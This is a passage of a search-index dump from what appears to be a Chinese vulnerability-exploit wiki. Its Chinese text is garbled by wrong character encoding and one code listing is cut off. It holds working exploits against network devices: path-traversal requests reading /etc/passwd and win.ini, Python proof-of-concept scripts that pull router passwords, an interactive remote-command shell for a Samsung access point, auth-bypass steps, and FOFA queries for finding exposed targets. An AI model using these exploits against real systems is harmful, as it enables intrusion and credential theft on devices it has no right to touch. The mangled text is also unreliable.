"},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TVTÊï∞Á†ÅÁßëÊäÄ/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TVTÊï∞Á†ÅÁßëÊäÄ/","title":"TVTÊï∞Á†ÅÁßëÊäÄ","keywords":"","body":"TVTÊï∞Á†ÅÁßëÊäÄ TVTÊï∞Á†ÅÁßëÊäÄ NVMS-1000 Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TVTÊï∞Á†ÅÁßëÊäÄ/TVTÊï∞Á†ÅÁßëÊäÄ NVMS-1000 Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/TVTÊï∞Á†ÅÁßëÊäÄ/TVTÊï∞Á†ÅÁßëÊäÄ NVMS-1000 Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥û.html","title":"TVTÊï∞Á†ÅÁßëÊäÄ NVMS-1000 Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥û","keywords":"","body":"TVTÊï∞Á†ÅÁßëÊäÄ NVMS-1000 Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ TVTÊï∞Á†ÅÁßëÊäÄ TVT NVMS-1000ÊòØ‰∏≠ÂõΩTVTÊï∞Á†ÅÁßëÊäÄÂÖ¨Âè∏ÁöÑ‰∏ÄÂ•óÁΩëÁªúÁõëÊéßËßÜÈ¢ëÁÆ°ÁêÜÁ≥ªÁªü„ÄÇ TVTÊï∞Á†ÅÁßëÊäÄ TVT NVMS-1000‰∏≠Â≠òÂú®Ë∑ØÂæÑÈÅçÂéÜÊºèÊ¥û„ÄÇËøúÁ®ãÊîªÂáªËÄÖÂèØÈÄöËøáÂèëÈÄÅÂåÖÂê´/../ÁöÑÁâπÂà∂URLËØ∑Ê±ÇÂà©Áî®ËØ•ÊºèÊ¥ûÊü•ÁúãÁ≥ªÁªü‰∏äÁöÑ‰ªªÊÑèÊñá‰ª∂„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TVT NVMS-1000 FOFA [!NOTE] app=\"TVT-NVMS-1000\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖËØªÂèñÊñá‰ª∂ GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËúÇÁΩë‰∫íËÅî/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËúÇÁΩë‰∫íËÅî/","title":"ËúÇÁΩë‰∫íËÅî","keywords":"","body":"ËúÇÁΩë‰∫íËÅî ËúÇÁΩë‰∫íËÅî ‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®v4.31 ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-16313 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËúÇÁΩë‰∫íËÅî/ËúÇÁΩë‰∫íËÅî ‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®v4.31 ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-16313.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ËúÇÁΩë‰∫íËÅî/ËúÇÁΩë‰∫íËÅî ‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®v4.31 ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-16313.html","title":"ËúÇÁΩë‰∫íËÅî ‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®v4.31 ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-16313","keywords":"","body":"ËúÇÁΩë‰∫íËÅî ‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®v4.31 ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-16313 ÊºèÊ¥ûÊèèËø∞ ËúÇÁΩë‰∫íËÅî‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®v4.31Â≠òÂú®Êé•Âè£Êú™ÊéàÊùÉËÆøÈóÆÔºåÂØºËá¥ÊîªÂáªËÄÖÂèØ‰ª•ÊòØÈÄöËøáÊ≠§ÊºèÊ¥ûÂæóÂà∞Ë∑ØÁî±Âô®Ë¥¶Âè∑ÂØÜÁ†ÅÊé•ÁÆ°Ë∑ØÁî±Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËúÇÁΩë‰∫íËÅî‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®v4.31 FOFA [!NOTE] app=\"ËúÇÁΩë‰∫íËÅî-‰∫íËÅî‰ºÅ‰∏öÁ∫ßË∑ØÁî±Âô®\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢ÁôªÂΩïÂêéÂèØ‰ª•ÁúãÂà∞ÔºåË¥¶Âè∑ÂØÜÁ†ÅÂ≠òÂú®Êé•Âè£ËÆøÈóÆ ËÄå /action/usermanager.htm Â≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆÔºåÂèØÈÄöËøáÁõ¥Êé•ËÆøÈóÆËé∑ÂæóË¥¶Âè∑ÂØÜÁ†Å [!NOTE] ‰∏çÂ≠òÂú®ÊºèÊ¥ûÊó∂ stateÂÄº‰∏∫ 3 ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: DrayTek‰ºÅ‰∏öÁΩëÁªúËÆæÂ§á \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/action/usermanager.htm\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/action/usermanager.htm \\033[0m\".format(target_url)) if \"pwd\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ IFW8Enterprise_router_Password_leakage Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÁßëÁΩëÂ®Å/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÁßëÁΩëÂ®Å/","title":"‰∏≠ÁßëÁΩëÂ®Å","keywords":"","body":"‰∏≠ÁßëÁΩëÂ®Å ‰∏≠ÁßëÁΩëÂ®Å ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ôÊéßÂà∂Á≥ªÁªü Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÁßëÁΩëÂ®Å/‰∏≠ÁßëÁΩëÂ®Å ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ôÊéßÂà∂Á≥ªÁªü Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÁßëÁΩëÂ®Å/‰∏≠ÁßëÁΩëÂ®Å ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ôÊéßÂà∂Á≥ªÁªü Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"‰∏≠ÁßëÁΩëÂ®Å ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ôÊéßÂà∂Á≥ªÁªü Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"‰∏≠ÁßëÁΩëÂ®Å ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ôÊéßÂà∂Á≥ªÁªü Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰∏≠ÁßëÁΩëÂ®Å ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ôÊéßÂà∂Á≥ªÁªü Â≠òÂú®Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÂâçÁ´ØËé∑ÂèñÂØÜÁ†ÅÁöÑMd5ÂêéËß£ÂØÜÂèØËé∑ÂèñÂÆåÊï¥ÂØÜÁ†ÅÁôªÈôÜÂêéÂè∞ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰∏≠ÁßëÁΩëÂ®Å ‰∏ã‰∏Ä‰ª£Èò≤ÁÅ´Â¢ôÊéßÂà∂Á≥ªÁªü FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã F12Êü•ÁúãÂâçÁ´ØÂèëÁé∞ adminÁöÑmd5Âä†ÂØÜÂØÜÁ†Å Ëß£ÂØÜÂêéÁôªÂΩïÂêéÂè∞ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Ëè≤ÂäõÂ∞î/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Ëè≤ÂäõÂ∞î/","title":"Ëè≤ÂäõÂ∞î","keywords":"","body":"Ëè≤ÂäõÂ∞î FLIR-AX8 download.php ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Ëè≤ÂäõÂ∞î/FLIR-AX8 download.php ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Ëè≤ÂäõÂ∞î/FLIR-AX8 download.php ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ.html","title":"FLIR-AX8 download.php ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ","keywords":"","body":"FLIR-AX8 download.php ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ ÊºèÊ¥ûÊèèËø∞ FLIR-AX8 download.phpÊñá‰ª∂ËøáÊª§‰∏çÂÖ® Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] FLIR-AX8 FOFA [!NOTE] app=\"FLIR-FLIR-AX8\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ download.php \"application/octet-stream\", \"zip\" => \"application/zip\", \"mp3\" => \"audio/mpeg\", \"mpg\" => \"video/mpeg\", \"avi\" => \"video/x-msvideo\", ); $ctype = isset($content_types[$file_ext]) ? $content_types[$file_ext] : $ctype_default; header(\"Content-Type: \" . $ctype); //check if http_range is sent by browser (or download manager) if(isset($_SERVER['HTTP_RANGE'])) { list($size_unit, $range_orig) = explode('=', $_SERVER['HTTP_RANGE'], 2); if ($size_unit == 'bytes') { //multiple ranges could be specified at the same time, but for simplicity only serve the first range //http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt list($range, $extra_ranges) = explode(',', $range_orig, 2); } else { $range = ''; header('HTTP/1.1 416 Requested Range Not Satisfiable'); exit; } } else { $range = ''; } //figure out download piece from range (if set) list($seek_start, $seek_end) = explode('-', $range, 2); ob_clean(); //set start and end based on range (if set), else set defaults //also check for invalid ranges. $seek_end = (empty($seek_end)) ? ($file_size - 1) : min(abs(intval($seek_end)),($file_size - 1)); $seek_start = (empty($seek_start) || $seek_end 0 || $seek_end ÁÆÄÂçïÂÆ°ËÆ°ÂèØ‰ª•ÂèëÁé∞ fileÂèÇÊï∞ ‰∏∫ÂèØÊéßÂèÇÊï∞‰∏îÊ≤°ÊúâËøáÊª§ÂèÇÊï∞ÔºåÂØºËá¥ÂèØ‰ª•‰∏ãËΩΩ‰ªªÊÑèÊñá‰ª∂ /download.php?file=/etc/passwd Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÊúóËßÜ/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÊúóËßÜ/","title":"ÊúóËßÜ","keywords":"","body":"ÊúóËßÜ ÊúóËßÜ TG400 GSM ÁΩëÂÖ≥ÁõÆÂΩïÈÅçÂéÜ CVE-2021-27328 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÊúóËßÜ/ÊúóËßÜ TG400 GSM ÁΩëÂÖ≥ÁõÆÂΩïÈÅçÂéÜ  CVE-2021-27328.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÊúóËßÜ/ÊúóËßÜ TG400 GSM ÁΩëÂÖ≥ÁõÆÂΩïÈÅçÂéÜ  CVE-2021-27328.html","title":"ÊúóËßÜ TG400 GSM ÁΩëÂÖ≥ÁõÆÂΩïÈÅçÂéÜ  CVE-2021-27328","keywords":"","body":"ÊúóËßÜ TG400 GSM ÁΩëÂÖ≥ÁõÆÂΩïÈÅçÂéÜ CVE-2021-27328 ÊºèÊ¥ûÊèèËø∞ ÊúóËßÜ TG400 GSM ÁΩëÂÖ≥Â≠òÂú®ÁõÆÂΩïÈÅçÂéÜ ÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÊúóËßÜ TG400 GSM ÁΩëÂÖ≥ ÊºèÊ¥ûÂ§çÁé∞ ÊöÇÊó†FOFAËØ≠Âè•ÂèäÂõ∫‰ª∂ËÆæÂ§áÂ§çÁé∞ Ëé∑ÂèñÂõ∫‰ª∂Ëß£ÂØÜÂØÜÁ†Å http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect /etc/passwdÔºö http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd ÂèÇËÄÉÊñáÁ´† https://github.com/SQSamir/CVE-2021-27328 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏âÊòü/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏âÊòü/","title":"‰∏âÊòü","keywords":"","body":"‰∏âÊòü ‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô® ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏âÊòü/‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô®  ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏âÊòü/‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô®  ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô®  ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô® ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô® Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÂèØÂú®Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãÊâßË°å‰ªªÊÑèÂëΩ‰ª§Ëé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô® FOFA [!NOTE] title==\"Samsung WLAN AP\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /(download)/tmp/a.txt HTTP/1.1 Host: 175.199.182.152 Connection: close Content-Length: 48 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ‰∏âÊòü WLAN AP WEA453eË∑ØÁî±Âô® \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:cat /etc/passwd| dd of=/tmp/a.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"root\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥û, ÂìçÂ∫î‰∏∫:\\n{}\\033[0m\".format(target_url, response.text)) while True: cmd = str(input(\"\\033[35mCmd >>> \\033[0m\")) POC_2(target_url, cmd) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÈªòËÆ§ÁÆ°ÁêÜÂëòÂº±Âè£‰ª§ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:{}| dd of=/tmp/a.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[36m{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Samsung_WLAN_AP_wea453e_router_RCE Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/È£ûÈ±ºÊòü/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/È£ûÈ±ºÊòü/","title":"È£ûÈ±ºÊòü","keywords":"","body":"È£ûÈ±ºÊòü È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî± cookie.cgi ÊùÉÈôêÁªïËøá È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü ÊùÉÈôêÁªïËøá‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/È£ûÈ±ºÊòü/È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî± cookie.cgi ÊùÉÈôêÁªïËøá.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/È£ûÈ±ºÊòü/È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî± cookie.cgi ÊùÉÈôêÁªïËøá.html","title":"È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî± cookie.cgi ÊùÉÈôêÁªïËøá","keywords":"","body":"È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî± cookie.cgi ÊùÉÈôêÁªïËøá ÊºèÊ¥ûÊèèËø∞ È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî±Â≠òÂú®ÊùÉÈôêÁªïËøáÔºåÈÄöËøáDropÁâπÂÆöÁöÑËØ∑Ê±ÇÂåÖËÆøÈóÆÊú™ÊéàÊùÉÁöÑÁÆ°ÁêÜÂëòÈ°µÈù¢ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî± È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"È£ûÈ±ºÊòüÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî±\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËÆøÈóÆ index.html Êó∂‰ºöËØ∑Ê±Ç cookie.cgi http://xxx.xxx.xxx.xxx/index.html È°µÈù¢ÊäìÂåÖ DropÊéâ cookie.cgi Ë∑≥ËΩ¨ÂêéÂè∞Ëé∑Âèñ‰∫ÜÊùÉÈôê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/È£ûÈ±ºÊòü/È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü ÊùÉÈôêÁªïËøá‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/È£ûÈ±ºÊòü/È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü ÊùÉÈôêÁªïËøá‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü ÊùÉÈôêÁªïËøá‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü ÊùÉÈôêÁªïËøá‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü Â≠òÂú®ÊùÉÈôêÁªïËøá‰ª•Âèä‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÂèØ‰ª•Ëé∑ÂèñÁÆ°ÁêÜÂëòÊùÉÈôê‰ª•ÂèäÁî®Êà∑ÂØÜÁ†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] È£ûÈ±ºÊòü ‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"È£ûÈ±ºÊòü‰ºÅ‰∏öÁ∫ßÊô∫ËÉΩ‰∏äÁΩëË°å‰∏∫ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÊùÉÈôêÁªïËøáÂèÇËÄÉ‰∏ä‰∏ÄÁØá È£ûÈ±ºÊòü ÂÆ∂Áî®Êô∫ËÉΩË∑ØÁî± cookie.cgi ÊùÉÈôêÁªïËøá ‰ø°ÊÅØÊ≥ÑÈú≤POC /request_para.cgi?parameter=wifi_info #Ëé∑ÂèñALL WIFIË¥¶Âè∑ÂØÜÁ†Å /request_para.cgi?parameter=wifi_get_5g_host 